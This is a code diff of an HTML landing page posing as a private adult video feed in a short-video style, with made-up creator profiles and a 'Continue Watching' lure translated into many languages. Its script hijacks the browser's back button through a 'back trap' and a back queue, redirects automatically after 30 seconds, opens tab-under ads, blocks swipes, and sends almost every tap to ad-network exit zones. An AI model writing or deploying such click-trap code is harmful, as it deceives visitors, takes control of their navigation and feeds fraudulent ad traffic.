@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
   <title>(1) Private Video Request</title>
   <link rel="icon" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="50" fill="%23ff0000"/><path d="M35 30 L75 50 L35 70 Z" fill="%23ffffff"/></svg>'>
 
@@ -10,14 +11,26 @@
     var APP_CONFIG = {
       domain: "https://jup9.com",
       clickMapMode: "reels",
+
+      // --- MAIN EXIT (dual) ---
       mainExit_currentTab_zoneId: 10217421,
       mainExit_newTab_zoneId: 10217420,
+
+      // --- TABUNDER (used by micro-handoff only, optional) ---
       tabUnderClick_zoneId: 10217421,
+
+      // --- AGE EXIT (dual) ---
       ageExit_currentTab_zoneId: 10217421,
       ageExit_newTab_zoneId: 10217420,
+
+      // --- AUTOEXIT (current tab) ---
       autoexit_zoneId: 10217422,
       autoexit_timeToRedirect: 30,
+
+      // --- REVERSE (popstate -> current tab) ---
       reverse_zoneId: 10217419,
+
+      // --- BACK QUEUE ---
       back_zoneId: 10217423,
       back_count: 6
     };
@@ -28,12 +41,14 @@
     html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
     .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; }
 
+    /* --- DOUBLE BUFFER --- */
     .video-layer {
       position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover;
       z-index: 0; background: #000; opacity: 0; transition: opacity 0.1s linear; pointer-events: none;
     }
     .video-layer.active { opacity: 1; z-index: 1; }
 
+    /* UI */
     .reels-ui {
       position: absolute; inset: 0; z-index: 10;
       display: flex; flex-direction: column; justify-content: space-between;
@@ -41,11 +56,11 @@
       background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%);
     }
 
-    /* Измененная позиция кнопки NEXT (выше) */
+    /* --- “Next” button (ПОДНЯЛ ВЫШЕ И ПРАВЕЕ) --- */
     .next-btn-wrap {
       position: absolute;
-      right: 20px;
-      top: 55%; /* Подняли выше */
+      right: 14px;
+      top: 55%; /* Изменил с bottom на top 55% */
       transform: translateY(-50%);
       z-index: 60;
       pointer-events: auto;
@@ -55,47 +70,73 @@
     }
 
     .next-btn {
-      width: 65px;
-      height: 65px;
+      width: 58px;
+      height: 58px;
       border-radius: 999px;
-      background: rgba(255, 0, 80, 0.9); /* Сделали чуть ярче */
-      border: 2px solid rgba(255,255,255,0.4);
+      background: rgba(30,30,30,0.75);
+      border: 1px solid rgba(255,255,255,0.18);
       backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 0 20px rgba(255, 0, 80, 0.4);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.45);
       cursor: pointer;
-      animation: pulseNext 1.5s infinite;
+      animation: pulseNext 1.7s infinite;
+      user-select: none;
     }
+    .next-btn:active { transform: scale(0.95); }
 
-    /* Рука подсказка теперь привязана к позиции кнопки */
-    .swipe-hint {
-      position: absolute;
-      right: 95px;
-      top: 55%;
-      transform: translateY(-50%);
-      z-index: 70;
-      pointer-events: none;
-    }
-    .hand-icon {
-      font-size: 48px;
-      filter: drop-shadow(0 0 10px rgba(0,0,0,0.8));
-      animation: hintRight 1.35s infinite ease-in-out;
-    }
-
-    @keyframes hintRight {
-      0% { transform: translateX(-20px); opacity: 0; }
-      50% { opacity: 1; }
-      100% { transform: translateX(10px); opacity: 0; }
+    .next-icon {
+      width: 26px;
+      height: 26px;
+      fill: #fff;
+      transform: translateX(1px);
+      opacity: 0.95;
     }
 
     @keyframes pulseNext {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.1); }
-      100% { transform: scale(1); }
+      0% { transform: translateY(0) scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.18), 0 10px 30px rgba(0,0,0,0.45); }
+      70% { transform: translateY(0) scale(1.06); box-shadow: 0 0 0 12px rgba(255,255,255,0), 0 10px 30px rgba(0,0,0,0.45); }
+      100% { transform: translateY(0) scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0), 0 10px 30px rgba(0,0,0,0.45); }
     }
 
+    /* --- STAGE 2 CTA (glass) --- */
+    .click-hint-overlay {
+      position: absolute; top: 44%; left: 50%; transform: translate(-50%, -50%);
+      z-index: 50; display: none;
+      flex-direction: column; align-items: center; justify-content: center; gap: 15px;
+      pointer-events: none; width: 100%;
+    }
+
+    .glass-btn {
+      display: flex; align-items: center; gap: 12px;
+      background: rgba(20, 20, 20, 0.45);
+      backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      padding: 14px 28px;
+      border-radius: 40px;
+      cursor: pointer;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+      animation: pulseGlass 2s infinite;
+      pointer-events: auto;
+      max-width: 90%;
+    }
+    .glass-btn:active { transform: scale(0.95); }
+    .glass-icon { width: 24px; height: 24px; fill: white; flex-shrink: 0; }
+    .glass-text {
+      color: #fff; font-size: 16px; font-weight: 600; letter-spacing: 0.5px;
+      text-transform: uppercase; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
+
+    @keyframes pulseGlass {
+      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); }
+      70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); }
+      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
+    }
+
+    /* Shake */
     .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
     @keyframes shake {
       10%, 90% { transform: translate3d(-2px, 0, 0); }
@@ -104,29 +145,68 @@
       40%, 60% { transform: translate3d(6px, 0, 0); }
     }
 
-    /* Остальные стили (Stage 2) */
-    .click-hint-overlay {
-      position: absolute; top: 44%; left: 50%; transform: translate(-50%, -50%);
-      z-index: 50; display: none; flex-direction: column; align-items: center; width: 100%;
-    }
-    .glass-btn {
-      display: flex; align-items: center; gap: 12px; background: rgba(20, 20, 20, 0.6);
-      backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.3);
-      padding: 16px 32px; border-radius: 40px; cursor: pointer; animation: pulseGlass 2s infinite;
-    }
-    .glass-text { color: #fff; font-size: 18px; font-weight: 700; text-transform: uppercase; }
+    /* Swipe video animations */
+    .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
+    .slide-in-up  { animation: slideInUp  0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; visibility: visible !important; z-index: 2 !important; }
+    @keyframes slideOutUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100%); opacity: 1; } }
+    @keyframes slideInUp  { 0% { transform: translateY(100%); opacity: 1; } 100% { transform: translateY(0); opacity: 1; } }
 
-    .slide-out-up { animation: slideOutUp 0.45s ease-in forwards; }
-    .slide-in-up  { animation: slideInUp  0.45s ease-out forwards; visibility: visible !important; }
-    @keyframes slideOutUp { 100% { transform: translateY(-100%); } }
-    @keyframes slideInUp  { 0% { transform: translateY(100%); } 100% { transform: translateY(0); } }
+    /* UI elements */
+    .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%; pointer-events: auto; }
+    .back-icon { width: 24px; height: 24px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); opacity: 0.9; }
 
-    .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; pointer-events: auto; }
-    .right-actions { position: absolute; left: 8px; bottom: 100px; display: flex; flex-direction: column; gap: 16px; pointer-events: auto; }
-    .action-btn { display: flex; flex-direction: column; align-items: center; }
-    .icon-circle { width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+    .filter-pill {
+      background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px);
+      border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px;
+      color: #fff; font-size: 13px; font-weight: 500;
+    }
+    .filter-icon { width: 14px; height: 14px; }
+
+    /* move actions to LEFT */
+    .right-actions {
+      position: absolute; left: 8px; bottom: 100px;
+      display: flex; flex-direction: column; align-items: center; gap: 16px;
+      pointer-events: auto;
+    }
+    .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+    .icon-circle { width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(2px); margin-bottom: 2px; }
+    .action-icon { width: 24px; height: 24px; }
+    .action-text { font-size: 12px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+    .dots-menu { display: flex; gap: 4px; margin-top: 10px; opacity: 0.8; }
+    .dot { width: 4px; height: 4px; background: #fff; border-radius: 50%; }
+
+    /* bottom info */
     .bottom-info { padding: 16px; color: #fff; margin-left: 60px; pointer-events: auto; }
-    .avatar { width: 32px; height: 32px; border-radius: 50%; background: #ff0050; border: 1px solid #fff; }
+    .user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+    .avatar { width: 32px; height: 32px; border-radius: 50%; background: #ff0050; border: 1px solid rgba(255,255,255,0.5); transition: background-color 0.3s; }
+    .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+    .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+
+    /* Hand hint -> ПОДНЯЛ ВЫШЕ К КНОПКЕ */
+    .swipe-hint {
+      position: absolute;
+      right: 92px;
+      top: 55%; /* Центрировал по кнопке */
+      transform: translateY(-50%);
+      z-index: 70;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0.95;
+    }
+    .hand-icon {
+      font-size: 44px;
+      filter: drop-shadow(0 0 10px rgba(0,0,0,0.8));
+      animation: hintRight 1.35s infinite ease-in-out;
+      transform-origin: center;
+    }
+    @keyframes hintRight {
+      0%   { transform: translateX(-14px); opacity: 0; }
+      35%  { opacity: 1; }
+      70%  { transform: translateX(10px); opacity: 1; }
+      100% { transform: translateX(10px); opacity: 0; }
+    }
   </style>
 
   <script defer src="./assets/scripts/common.js?v=3.1"></script>
@@ -134,117 +214,222 @@
 
 <body>
   <div class="reels-wrapper" id="click-trap">
-    <video id="v1" class="video-layer active" playsinline muted loop preload="auto"></video>
-    <video id="v2" class="video-layer" playsinline muted loop preload="auto"></video>
+    <video id="v1" class="video-layer active" playsinline webkit-playsinline muted loop preload="auto"></video>
+    <video id="v2" class="video-layer" playsinline webkit-playsinline muted loop preload="auto"></video>
 
     <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">👉</div></div>
 
     <div class="next-btn-wrap" id="next-wrap">
-      <div class="next-btn" id="next-btn">
-        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+      <div class="next-btn" id="next-btn" aria-label="Next">
+        <svg class="next-icon" viewBox="0 0 24 24"><path d="M9 6l6 6-6 6" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
     </div>
 
     <div id="click-hint" class="click-hint-overlay">
       <div class="glass-btn" data-mt="mainExit" data-stop="1">
+        <svg class="glass-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg>
         <span class="glass-text" id="lang-text">Continue Watching</span>
       </div>
     </div>
 
     <div class="reels-ui">
       <div class="top-bar">
-        <svg width="24" height="24" data-mt="reverse" data-stop="1" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><polyline points="15 18 9 12 15 6"></polyline></svg>
+        <svg class="back-icon" data-mt="reverse" data-stop="1" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+
+        <div class="filter-pill" data-mt="mainExit" data-stop="1">
+          <svg class="filter-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+            <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon>
+          </svg>
+          <span>Filters</span>
+        </div>
       </div>
 
       <div class="right-actions">
         <div class="action-btn" data-mt="mainExit" data-stop="1">
-          <div class="icon-circle"><svg width="24" height="24" fill="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg></div>
-          <span style="color:white; font-size:12px;">93</span>
+          <div class="icon-circle">
+            <svg class="action-icon" viewBox="0 0 24 24" fill="white" stroke="none">
+              <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+            </svg>
+          </div>
+          <span class="action-text" id="ui-likes">93</span>
         </div>
+
+        <div class="action-btn" data-mt="mainExit" data-stop="1">
+          <div class="icon-circle">
+            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round">
+              <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
+            </svg>
+          </div>
+          <span class="action-text">Share</span>
+        </div>
+
+        <div class="action-btn" data-mt="ageExit" data-stop="1">
+          <div class="icon-circle">
+            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M14.5 4l-9.5 9.5a2.5 2.5 0 0 0 3.5 3.5l9.5-9.5"/>
+              <path d="M18 7L21 4" stroke-width="2.5"/><path d="M14 10L12 7" stroke-width="2"/><path d="M20 10L22 13" stroke-width="2"/>
+              <path d="M19.5 2.5l1 1-1 1-1-1 1-1z" fill="white" stroke="none"/>
+            </svg>
+          </div>
+        </div>
+
+        <div class="dots-menu"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
       </div>
 
       <div class="bottom-info">
-        <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
-          <div class="avatar"></div><div style="font-weight:700;">@Sweet_Alice</div>
-        </div>
-        <div style="font-size:14px;">Do you like my view? 😈 <br>Check link in bio... 👇</div>
+        <div class="user-row"><div class="avatar" id="ui-avatar"></div><div class="username" id="ui-username">@Sweet_Alice</div></div>
+        <div class="desc" id="ui-desc">Do you like my view? 😈 <br>Check link in bio... 👇</div>
       </div>
     </div>
   </div>
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
+      const reelsData = [
+        {},
+        { user: "@Sweet_Alice", likes: "93", desc: "Do you like my view? 😈 <br>Check link in bio... 👇", color: "#ff0050" },
+        { user: "@Naughty_Kate", likes: "12.4k", desc: "Wait for the end... 💦 <br>Link in bio!", color: "#0095f6" }
+      ];
+
+      const translations = {
+        en: "Continue Watching", ru: "Смотреть дальше", es: "Continuar viendo", de: "Weiter ansehen",
+        fr: "Continuer à regarder", pt: "Continuar assistindo", it: "Continua a guardare", tr: "İzlemeye devam et",
+        ar: "متابعة المشاهدة", zh: "继续观看", ja: "視聴を続ける", ko: "계속 시청하기", hi: "देखная जारी रखें",
+        id: "Lanjutkan Menonton", vi: "Tiếp tục xem", th: "ดูต่อ"
+      };
+
+      const vib = (ms=25) => { try { navigator.vibrate && navigator.vibrate(ms); } catch {} };
+
+      const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
+      const langText = document.getElementById("lang-text");
+      langText.innerText = translations[userLang] || translations.en;
+      if (userLang === 'ar') document.querySelector('.glass-btn').style.direction = 'rtl';
+
       const v1 = document.getElementById('v1');
       const v2 = document.getElementById('v2');
       const swipeHint = document.getElementById("swipe-hint");
       const clickHint = document.getElementById("click-hint");
       const wrapper = document.querySelector('.reels-wrapper');
-      const nextBtn = document.getElementById("next-btn");
+
       const nextWrap = document.getElementById("next-wrap");
+      const nextBtn  = document.getElementById("next-btn");
 
-      let stage = 1;
-      let isAnimating = false;
+      const uiUser = document.getElementById('ui-username');
+      const uiLikes = document.getElementById('ui-likes');
+      const uiDesc = document.getElementById('ui-desc');
+      const uiAvatar = document.getElementById('ui-avatar');
 
-      const vib = (ms=30) => { try { navigator.vibrate && navigator.vibrate(ms); } catch {} };
-
-      // Загрузка видео
       const urlParams = new URLSearchParams(window.location.search);
       const offerID = urlParams.get('v') || '1';
-      v1.src = `./assets/videos/lend${offerID}/reels-1.mp4`;
-      v2.src = `./assets/videos/lend${offerID}/reels-2.mp4`;
-      v1.play().catch(()=>{});
+      const getPath = (index) => `./assets/videos/lend${offerID}/reels-${index}.mp4`;
 
-      function goToStage2() {
-        if (isAnimating || stage !== 1) return;
+      v1.src = getPath(1);
+      v1.play().catch(()=>{});
+      v2.src = getPath(2);
+      v2.load();
+
+      let stage = 1;
+      let touchStartY = 0;
+      let touchEndY = 0;
+      let isAnimating = false;
+
+      function armBackTrap() {
+        if (window.__BACK_ARMED_ON_STAGE2__) return;
+        try {
+          if (window.LANDING_EXITS?.initBack) {
+            window.LANDING_EXITS.initBack();
+            window.__BACK_ARMED_ON_STAGE2__ = true;
+            return;
+          }
+          const tick = setInterval(() => {
+            if (window.LANDING_EXITS?.initBack) {
+              window.LANDING_EXITS.initBack();
+              window.__BACK_ARMED_ON_STAGE2__ = true;
+              clearInterval(tick);
+            }
+          }, 50);
+          setTimeout(() => clearInterval(tick), 2500);
+        } catch {}
+      }
+
+      function doSwapToStage2() {
+        if (isAnimating) return;
         isAnimating = true;
-        
-        // Армируем ловушку "Назад"
-        if (window.LANDING_EXITS?.initBack) window.LANDING_EXITS.initBack();
+
+        swipeHint.style.display = 'none';
+        nextWrap.style.display = 'none';
 
         v1.classList.add('slide-out-up');
         v2.classList.add('slide-in-up');
         v2.play().catch(()=>{});
 
-        swipeHint.style.display = 'none';
-        nextWrap.style.display = 'none';
+        const newData = reelsData[2];
+        if (newData) {
+          uiUser.innerText = newData.user;
+          uiLikes.innerText = newData.likes;
+          uiDesc.innerHTML = newData.desc;
+          uiAvatar.style.backgroundColor = newData.color;
+        }
 
         setTimeout(() => {
           v1.classList.remove('active', 'slide-out-up');
           v1.pause();
           v2.classList.add('active');
           v2.classList.remove('slide-in-up');
+
           clickHint.style.display = 'flex';
           stage = 2;
           isAnimating = false;
         }, 450);
       }
 
-      // Клик по любому месту (Stage 1 -> в Stage 2, Stage 2 -> Exit)
-      wrapper.addEventListener("click", (e) => {
-        if (e.target?.closest?.("[data-mt]")) return;
+      // NEXT click
+      nextBtn.addEventListener("click", (e) => {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        armBackTrap();
+        doSwapToStage2();
+      }, true);
 
-        if (stage === 1) {
-          goToStage2();
-        } else if (stage === 2) {
-          window.LANDING_EXITS?.run?.("mainExit");
-        }
-      });
+      // TOUCH LOGIC: Shake and Vibrate
+      wrapper.addEventListener('touchstart', (e) => {
+        touchStartY = e.changedTouches[0].screenY;
+      }, { passive: true });
 
-      // Обработка свайпа (запрет с вибрацией)
-      let tsY = 0;
-      wrapper.addEventListener('touchstart', (e) => { tsY = e.touches[0].clientY; }, {passive:true});
       wrapper.addEventListener('touchend', (e) => {
-        let teY = e.changedTouches[0].clientY;
-        if (tsY - teY > 40) { // Попытка свайпа вверх
-          vib(40);
-          const targetBtn = stage === 1 ? nextBtn : document.querySelector('.glass-btn');
-          if (targetBtn) {
-            targetBtn.classList.remove('shake');
-            void targetBtn.offsetWidth;
-            targetBtn.classList.add('shake');
+        touchEndY = e.changedTouches[0].screenY;
+        if (touchStartY - touchEndY > 50) {
+          vib(40); // ВИБРАЦИЯ при свайпе
+          if (stage === 1 && nextBtn) {
+            nextBtn.classList.remove('shake');
+            void nextBtn.offsetWidth;
+            nextBtn.classList.add('shake');
+          } else if (stage === 2) {
+            const btn = document.querySelector('.glass-btn');
+            if (btn) {
+              btn.classList.remove('shake');
+              void btn.offsetWidth;
+              btn.classList.add('shake');
+            }
           }
         }
-      }, {passive:true});
+      }, { passive: true });
+
+      // Background clicks
+      wrapper.addEventListener("click", (e) => {
+        if (e.target?.closest?.("[data-mt]")) return; 
+        if (e.target === nextBtn || e.target?.closest?.("#next-btn")) return;
+
+        if (stage === 1) {
+            // ТЕПЕРЬ МОЖНО ПЕРЕЙТИ НА 2 ЭКРАН ПО ВИДЕО
+            armBackTrap();
+            doSwapToStage2();
+        } else if (stage === 2) {
+          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+          window.LANDING_EXITS?.run?.("mainExit");
+        }
+      }, true);
     });
   </script>
 </body>
